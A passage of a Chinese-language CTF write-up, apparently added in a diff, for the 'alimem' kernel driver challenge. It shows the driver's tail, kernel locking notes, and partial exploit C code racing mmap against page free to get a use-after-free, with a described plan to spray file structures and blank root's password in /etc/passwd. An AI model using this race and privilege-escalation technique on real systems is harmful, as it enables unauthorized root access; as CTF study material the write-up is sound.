+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">    already_open--;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">pr_info</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">alimem: device close</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">static </span><span style="color:#c0c5ce;">ssize_t </span><span style="color:#8fa1b3;">alimem_write</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> file *</span><span style="color:#bf616a;">file</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">const char</span><span style="color:#c0c5ce;"> __user *</span><span style="color:#bf616a;">buf</span><span style="color:#c0c5ce;">,
+</span><span style="color:#c0c5ce;">                          size_t </span><span style="color:#bf616a;">len</span><span style="color:#c0c5ce;">, loff_t *</span><span style="color:#bf616a;">ppos</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-EINVAL;
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">static </span><span style="color:#c0c5ce;">ssize_t </span><span style="color:#8fa1b3;">alimem_read</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> file *</span><span style="color:#bf616a;">filp</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> __user *</span><span style="color:#bf616a;">buf</span><span style="color:#c0c5ce;">,
+</span><span style="color:#c0c5ce;">                         size_t </span><span style="color:#bf616a;">count</span><span style="color:#c0c5ce;">, loff_t *</span><span style="color:#bf616a;">f_pos</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">-EINVAL;
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">static struct</span><span style="color:#c0c5ce;"> file_operations alimem_fops = {
+</span><span style="color:#c0c5ce;">    .</span><span style="color:#bf616a;">owner </span><span style="color:#c0c5ce;">= THIS_MODULE,
+</span><span style="color:#c0c5ce;">    .</span><span style="color:#bf616a;">mmap </span><span style="color:#c0c5ce;">= alimem_mmap,
+</span><span style="color:#c0c5ce;">    .</span><span style="color:#bf616a;">write </span><span style="color:#c0c5ce;">= alimem_write,   
+</span><span style="color:#c0c5ce;">    .</span><span style="color:#bf616a;">read </span><span style="color:#c0c5ce;">= alimem_read,
+</span><span style="color:#c0c5ce;">    .</span><span style="color:#bf616a;">open </span><span style="color:#c0c5ce;">= alimem_open,
+</span><span style="color:#c0c5ce;">    .</span><span style="color:#bf616a;">release </span><span style="color:#c0c5ce;">= alimem_close,
+</span><span style="color:#c0c5ce;">    .</span><span style="color:#bf616a;">unlocked_ioctl </span><span style="color:#c0c5ce;">= alimem_ioctl,
+</span><span style="color:#c0c5ce;">};
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">static struct</span><span style="color:#c0c5ce;"> miscdevice alimem_dev = {
+</span><span style="color:#c0c5ce;">    .</span><span style="color:#bf616a;">minor </span><span style="color:#c0c5ce;">= MISC_DYNAMIC_MINOR,
+</span><span style="color:#c0c5ce;">    .</span><span style="color:#bf616a;">name </span><span style="color:#c0c5ce;">= DEVICE_NAME,
+</span><span style="color:#c0c5ce;">    .</span><span style="color:#bf616a;">fops </span><span style="color:#c0c5ce;">= &amp;alimem_fops,
+</span><span style="color:#c0c5ce;">};
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">static int</span><span style="color:#c0c5ce;"> __init </span><span style="color:#8fa1b3;">alimem_init</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">) { </span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">misc_register</span><span style="color:#c0c5ce;">(&amp;alimem_dev); }
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">static void</span><span style="color:#c0c5ce;"> __exit </span><span style="color:#8fa1b3;">alimem_exit</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> idx;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> alimem_page *page;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">down_write</span><span style="color:#c0c5ce;">(&amp;pages_lock);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(idx = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; idx &lt; MAX_PAGES; idx++) {
+</span><span style="color:#c0c5ce;">        page = pages[idx];
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(page) {
+</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">free_pages</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;">)page-&gt;virt, PAGE_ORDER);
+</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">kfree</span><span style="color:#c0c5ce;">(page);
+</span><span style="color:#c0c5ce;">            pages[idx] = </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">        }
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">up_write</span><span style="color:#c0c5ce;">(&amp;pages_lock);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">misc_deregister</span><span style="color:#c0c5ce;">(&amp;alimem_dev);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#8fa1b3;">module_init</span><span style="color:#c0c5ce;">(alimem_init);
+</span><span style="color:#8fa1b3;">module_exit</span><span style="color:#c0c5ce;">(alimem_exit);
+</span><span style="color:#8fa1b3;">MODULE_LICENSE</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">GPL</span><span style="color:#c0c5ce;">&quot;);
+</span></pre>
+<p><code>down_write()/up_write()</code> 读写信号量
+down获取写锁，up释放写锁
+用于修改共享数据结构时，通过写锁保证原子性</p>
+<p>RCU 无锁读机制
+<code>rcu_read_lock()/rcu_read_unlock()</code>标记读者进入/退出临界区</p>
+<p><code>atomic_dec_and_test()/atomic_inc()</code>原子操作
+原子地增加计数器（无锁）；原子地减少计数器 并检测是否到0（若0返回true）
+用于管理共享资源引用计数</p>
+<p>这里关于<code>alimem_mmap()</code>中idx的获取
+假设用户空间调用 <code>mmap</code> 时指定了 <code>offset</code> 参数：</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*addr = </span><span style="color:#8fa1b3;">mmap</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, </span><span style="color:#d08770;">10 </span><span style="color:#c0c5ce;">* PAGE_SIZE);
+</span></pre>
+<ul>
+<li>这里的 <code>offset</code> 是 <code>10 * PAGE_SIZE</code>，表示用户空间希望映射设备的第 10 页</li>
+<li>内核会将 <code>offset</code> 转换为 <code>vma-&gt;vm_pgoff</code>，并将其设置为 10</li>
+</ul>
+<h2 id="jie-ti-si-lu">解题思路</h2><p>先获取指针映射，再增加引用
+竞争时机：映射完成后，增加引用前，free执行发现引用归0，执行<code>free_page_rcu()</code>
+<img src="./images/Screenshot%202025-03-13%20at%2023.32.04.png" alt="" /></p>
+<h2 id="exp">exp</h2><p>第一个线程写入A并标志第一次写入完成，此时第二个线程进行mmap操作同时紧接着第一个线程进行free操作</p>
+<p>判断target_addr即mmap返回地址非零，则第一个线程进行第二次申请内存和写操作，判断刚才映射的地址内容是否更改。如果更改了 说明uaf成功（之前映射的内存被释放后又被申请 所以内容变更）</p>
+<p>后续因为内存是用<code>__get_free_pages()</code>释放的 进入伙伴系统，所以直接喷file结构体，修改权限将<code>/etc/passwd</code>中root密码置空</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">_GNU_SOURCE
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">errno.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdio.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdlib.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">string.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/fcntl.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/mman.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/ioctl.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">unistd.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">pthread.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">signal.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">CHECK</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">x</span><span style="color:#c0c5ce;">) ({ errno = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; </span><span style="color:#8fa1b3;">typeof</span><span style="color:#c0c5ce;">(x) __x = (x); </span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(errno) { </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(#x); </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">); } __x; })
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">DEVICE_NAME &quot;</span><span style="color:#a3be8c;">alimem</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">PAGE_SIZE </span><span style="color:#d08770;">0x1000
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">ALIMEM_ALLOC </span><span style="color:#d08770;">0x1337
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">ALIMEM_FREE </span><span style="color:#d08770;">0x1338
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">ALIMEM_WRITE </span><span style="color:#d08770;">0x1339
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">ALIMEM_READ </span><span style="color:#d08770;">0x133a
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">alimem_write {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> idx;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">unsigned int</span><span style="color:#c0c5ce;"> offset;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*data;
+</span><span style="color:#c0c5ce;">    size_t size;
+</span><span style="color:#c0c5ce;">};
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">alimem_read {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> idx;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">unsigned int</span><span style="color:#c0c5ce;"> offset;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*data;
+</span><span style="color:#c0c5ce;">    size_t size;
+</span><span style="color:#c0c5ce;">};
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">alimem_alloc</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">fd</span><span style="color:#c0c5ce;">){
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(fd, ALIMEM_ALLOC, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">alimem_free</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">fd</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">idx</span><span style="color:#c0c5ce;">){
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(fd, ALIMEM_FREE, &amp;idx);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">alimem_write</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">fd</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">idx</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">unsigned int </span><span style="color:#bf616a;">off</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">buf</span><span style="color:#c0c5ce;">, size_t </span><span style="color:#bf616a;">size</span><span style="color:#c0c5ce;">){
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> alimem_write wr = {
+</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">idx </span><span style="color:#c0c5ce;">= idx,
+</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">offset </span><span style="color:#c0c5ce;">= off,
+</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">data </span><span style="color:#c0c5ce;">= buf,
+</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">size </span><span style="color:#c0c5ce;">= size
+</span><span style="color:#c0c5ce;">    };
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(fd, ALIMEM_WRITE, &amp;wr);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">alimem_read</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">fd</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">idx</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">unsigned int </span><span style="color:#bf616a;">off</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">buf</span><span style="color:#c0c5ce;">, size_t </span><span style="color:#bf616a;">size</span><span style="color:#c0c5ce;">){
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> alimem_read rd = {
+</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">idx </span><span style="color:#c0c5ce;">= idx,
+</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">offset </span><span style="color:#c0c5ce;">= off,
+</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">data </span><span style="color:#c0c5ce;">= buf,
+</span><span style="color:#c0c5ce;">        .</span><span style="color:#bf616a;">size </span><span style="color:#c0c5ce;">= size
+</span><span style="color:#c0c5ce;">    };
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(fd, ALIMEM_READ, &amp;rd);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> stop=</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, written=</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sec_written=</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*target_addr = </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">;
+</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> fds[</span><span style="color:#d08770;">0x200</span><span style="color:#c0c5ce;">];
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#8fa1b3;">func1</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">arg</span><span style="color:#c0c5ce;">){
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> fd = *(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">*)arg;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">CHECK</span><span style="color:#c0c5ce;">( fd &gt; </span><span style="color:#d08770;">0 </span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> in_buf[</span><span style="color:#d08770;">0x200</span><span style="color:#c0c5ce;">];
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">while </span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">){
+</span><span style="color:#c0c5ce;">        written = sec_written = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">alimem_alloc</span><span style="color:#c0c5ce;">(fd);
+</span><span style="color:#c0c5ce;">        in_buf[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">] = &#39;</span><span style="color:#a3be8c;">A</span><span style="color:#c0c5ce;">&#39;;
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">alimem_write</span><span style="color:#c0c5ce;">(fd, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, in_buf, </span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">        written = </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">usleep</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">10</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">alimem_free</span><span style="color:#c0c5ce;">(fd, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(target_addr &lt;= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) </span><span style="color:#b48ead;">continue</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">        in_buf[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">] = &#39;</span><span style="color:#a3be8c;">B</span><span style="color:#c0c5ce;">&#39;;
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">alimem_alloc</span><span style="color:#c0c5ce;">(fd);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">alimem_write</span><span style="color:#c0c5ce;">(fd, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, in_buf, </span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(target_addr[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">] == &#39;</span><span style="color:#a3be8c;">B</span><span style="color:#c0c5ce;">&#39;){
+</span><span style="color:#c0c5ce;">            stop = </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">            sec_written = </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">        }
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">alimem_free</span><span style="color:#c0c5ce;">(fd, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">        sec_written = </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">    
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#8fa1b3;">func2</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">arg</span><span style="color:#c0c5ce;">){
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> fd = *(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">*)arg;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">while </span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">){
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">while </span><span style="color:#c0c5ce;">(!written) {};
+</span><span style="color:#c0c5ce;">        target_addr = (</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;">*)</span><span style="color:#8fa1b3;">mmap</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(target_addr &lt;= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">continue</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">while</span><span style="color:#c0c5ce;">(!sec_written) {};
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(stop)
+</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">        target_addr = </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">handle_segv</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">sig</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">fprintf</span><span style="color:#c0c5ce;">(stderr, &quot;</span><span style="color:#a3be8c;">Thread crashed with SIGSEGV</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">main</span><span style="color:#c0c5ce;">() {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">signal</span><span style="color:#c0c5ce;">(SIGSEGV, handle_segv);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> fd = </span><span style="color:#8fa1b3;">open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/dev/alimem</span><span style="color:#c0c5ce;">&quot;, O_RDWR);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    pthread_t p1, p2;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">CHECK</span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">pthread_create</span><span style="color:#c0c5ce;">(&amp;p1, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">, func1, (</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">*)&amp;fd) != </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">CHECK</span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">pthread_create</span><span style="color:#c0c5ce;">(&amp;p2, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">, func2, (</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">*)&amp;fd) != </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">pthread_join</span><span style="color:#c0c5ce;">(p1, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">pthread_join</span><span style="color:#c0c5ce;">(p2, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">uaf addr: 0x</span><span style="color:#d08770;">%llx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, (</span><span style="color:#b48ead;">long long</span><span style="color:#c0c5ce;">)target_addr);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> buf[</span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">];
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(buf, &#39;</span><span style="color:#a3be8c;">C</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">alimem_write</span><span style="color:#c0c5ce;">(fd, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, buf, </span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(target_addr[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">] == &#39;</span><span style="color:#a3be8c;">C</span><span style="color:#c0c5ce;">&#39;){
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">alimem_free</span><span style="color:#c0c5ce;">(fd, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(target_addr[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">] != &#39;</span><span style="color:#a3be8c;">C</span><span style="color:#c0c5ce;">&#39;)
+</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] uaf success</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">else</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] uaf failed</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
